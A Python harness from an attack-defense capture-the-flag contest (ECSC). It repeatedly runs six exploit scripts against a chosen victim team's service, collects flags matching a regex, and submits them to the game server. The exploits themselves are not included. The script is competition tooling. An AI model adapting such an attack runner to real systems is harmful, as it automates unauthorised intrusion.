#!/usr/bin/env python3

import re
import requests
import socket
import subprocess
import sys


FLAG_REGEX = re.compile(r'ECSC_[A-Za-z0-9\+/]{32}')


EXPLOITS = {
    'blinkygram_flagstore1': [
        './exploit1.py',
        './exploit2.py',
    ],
    'blinkygram_flagstore2': [
        './exploit3.py',
        './exploit4.py',
        './exploit5.py',
        './exploit6.py',
    ],
}


def do_round(team: str):
    teams = requests.get('http://10.10.254.254/competition/teams.json').json()

    flags = set()

    for flagstore, exes in EXPLOITS.items():
        flag_ids = teams['flag_ids'][flagstore][team]

        for exe in exes:
            proc = subprocess.Popen(
                [exe, f'10.10.{team}.1', flag_ids[-1]],
                bufsize=1,
                universal_newlines=True,
                stdout=subprocess.PIPE)

            for line in proc.stdout:
                sys.stdout.write(line)
                sys.stdout.flush()
                flags.update(FLAG_REGEX.findall(line))

    sock = socket.create_connection(('10.10.254.254', 31337))
    for flag in flags:
        print(f'[*] Submitting flag: {flag}')
        sys.stdout.flush()
        sock.sendall(flag.encode() + b'\n')
    sock.close()


def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <victim team ID>')
        exit(1)

    team = sys.argv[1]

    while True:
        do_round(team)


if __name__ == '__main__':
    main()
